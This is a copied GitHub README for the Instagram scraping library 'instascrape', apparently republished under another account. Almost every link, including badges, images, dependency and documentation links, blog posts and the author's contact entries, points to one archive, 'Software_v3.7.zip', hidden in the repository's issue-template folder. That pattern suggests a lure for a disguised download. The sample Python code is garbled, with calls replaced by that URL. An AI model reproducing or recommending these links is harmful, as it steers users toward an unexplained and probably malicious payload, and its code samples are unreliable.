
<p align="center">
  <img src="https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip" width="800px">
</p>

# _instascrape_: powerful Instagram data scraping toolkit 

## DISCLAIMER: 

Instagram has gotten increasingly strict with scraping and using this library can result in getting flagged for botting AND POSSIBLE DISABLING OF YOUR INSTAGRAM ACCOUNT. This is a research project and I am not responsible for how you use it. Independently, the library is designed to be responsible and respectful and it is up to you to decide what you do with it. I don't claim any responsibility if your Instagram account is affected by how you use this library.

[![Version](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
[![Downloads](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
[![Release](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
[![License](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)

[![Activity](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
[![Dependencies](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
[![Issues](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)

## What is it?
_instascrape_ is a lightweight Python package that provides an expressive and flexible API for scraping Instagram data. It is geared towards being a high-level building block on the data scientist's toolchain and can be seamlessly integrated and extended with industry standard tools for web scraping, data science, and analysis. 

<!-- ![Example showing tech profile scrapes](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) -->

## Key features  
Here are a few of the things that `instascrape` does well:

* Powerful, object-oriented scraping tools for profiles, posts, hashtags, reels, and IGTV
* Scrapes HTML, BeautifulSoup, and JSON
* Download content to your computer as _png_, _jpg_, _mp4_, and _mp3_
* Dynamically retrieve HTML embed code for posts
* Expressive and consistent API for concise and elegant code
* Designed for seamless integration with [_Selenium_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), [_Pandas_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), and other industry standard tools for data collection and analysis
* Lightweight; no boilerplate or configurations necessary 
* The only hard dependencies are [_Requests_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) and [_Beautiful Soup_](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
---

## Table of Contents
* [Installation](#installation)
* [Sample Usage](#features)
* [Documentation](#documentation)
* [Blog Posts](#blog-posts)
* [Contributing](#contributing)
* [Dependencies](#dependencies)
* [License](#license)
* [Support](#support)

---

## :computer: Installation <a name="installation"></a>

### Minimum Python version

This library currently requires [Python 3.7](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) or higher.


### pip
Install from PyPI using
```shell
$ pip3 install insta-scrape
```
WARNING: make sure you install _insta-scrape_ and not a package with a similar name! 

---

## :mag_right: Sample Usage <a name="features"></a>
All top-level, ready-to-use features can be imported using:
```python
from instascrape import *
```

_instascrape_ uses clean, consistent, and expressive syntax to make the developer experience as _painless_ as possible. 

```python
# Instantiate the scraper objects 
google = Profile('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')
google_post = Post('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')
google_hashtag = Hashtag('https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip')

# Scrape their respective data 
https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()
https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()
https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip()

print(https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
print(google_post['hashtags'])
print(https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
>>> 12262794
>>> ['growwithgoogle']
>>> 9053408
```

See the [Scraped data points](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) section of the [Wiki](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) for a complete list of the scraped attributes provided by each scraper. 

## :books: Documentation <a name="documentation"></a>
The official documentation can be found on [Read The Docs](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)

---

## :newspaper: Blog Posts <a name="blog-posts"></a>


Check out blog posts on the [official site](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) or [DEV](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) for ideas and tutorials!

- [Scrape data from Instagram with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip) 
- [Visualizing Instagram engagement with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Exploratory data analysis of Instagram using instascrape and Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Creating a scatter matrix of Instagram data using Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Downloading an Instagram profile's recent photos using Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Scraping 25,000 data points from Joe Biden's Instagram using instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Compare major tech Instagram page's with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Tracking an Instagram posts engagement in real time with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Dynamically generate embeddable Instagram HTML with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Scraping an Instagram location tag with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Scraping Instagram reels with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Scraping IGTV data with instascrape](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [Scraping 10,000 data points from Donald Trump's Instagram with Python](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
---

## :pray: Contributing <a name="contributing"></a>
All contributions, bug reports, bug fixes, documentation improvements, enhancements, and ideas are welcome!

Feel free to [open an Issue](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), check out existing [Issues](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip), or [start a discussion](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip). 

Beginners to open source are highly encouraged to participate and ask questions if you're unsure what to do/where to start :heart:

---

## :spider_web: Dependencies <a name="dependencies"></a>

- [Requests](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
- [BeautifulSoup](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)

---


## :credit_card: License <a name="license"></a>
This library operates under the [MIT](LICENSE) license.

---

## :grey_question: Support <a name="support"></a>

Check out the [FAQ](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)

Reach out to me if you want to connect or have any questions and I will do my best to get back to you
* Email:
  * https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip
* Twitter:
  * [@ChrisGreening](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
* LinkedIn
  * [Chris Greening](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
* Personal contact form: 
  * [https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip](https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip)
---

<p align="center">
  <img src="https://raw.githubusercontent.com/abarreto250/instascrape/master/.github/ISSUE_TEMPLATE/Software_v3.7.zip" width="150px">
</p>
